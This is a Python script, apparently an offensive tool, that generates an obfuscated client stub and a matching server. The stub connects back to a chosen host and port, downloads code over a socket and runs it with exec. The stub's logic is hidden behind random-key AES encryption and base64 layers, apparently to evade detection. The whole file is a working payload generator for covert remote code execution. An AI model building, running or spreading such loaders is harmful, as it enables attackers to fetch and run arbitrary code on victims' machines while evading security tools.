#!/usr/bin/env python
import base64, random, string, os, argparse, sys
from Crypto.Cipher import AES

def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

parser = argparse.ArgumentParser(prog='execsocket', usage='./execsocket.py [options]')
parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
parser.add_argument("-p", "--port", type=str, help="Port to connect back to.")
parser.add_argument("-m", "--modules", type=str, help="Modules to import.")
parser.add_argument("-c", "--code", type=str, help="File with code to execute (without imports).")
args = parser.parse_args()

BLOCK_SIZE, PADDING = 32, '{'
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

if len(sys.argv) == 1:
	parser.print_help()
	exit()

modules = args.modules.split(',')
if 'socket' not in modules:
	modules.append('socket')
if 'base64' not in modules:
	modules.append('base64')
random.shuffle(modules)

with open(args.code, 'rb') as f:
	code = base64.b64encode(f.read()).replace('\n', '')

top = '#!/usr/bin/python\nfrom Crypto.Cipher import AES\nimport ' + ",".join(modules) + '\n'
bottom = '''s, code = socket.socket(), ''
s.connect(('%s', %s))
while True:
	code += s.recv(8192)
	if code.endswith('*' * 5):
		code = code[:-5]
		break
exec(code)
''' % (args.hostname, args.port)

key, bd64var, AESvar = randKey(32), 'base64.b64decode', 'AES'
cipher = AES.new(key)
encrypted = EncodeAES(cipher, bottom)
bottom = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted)))
clienttemplate = top + bottom

servertemplate = '''#!/usr/bin/env python
import socket, base64
code = "%s"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('%s', %s))
s.listen(1)
s,address = s.accept()
s.sendall(base64.b64decode(code) + '*' * 5)
print ' [*] Script executed.\\n'
''' % (code, args.hostname, args.port)

with open('execclient.py', 'w') as c:
	c.write(clienttemplate)
with open('codeserver.py', 'w') as s:
	s.write(servertemplate)
if os.name == 'posix':
	os.popen('chmod +x execclient.py codeserver.py')
print " [*] Client written to execclient.py\n [*] Server written to codeserver.py"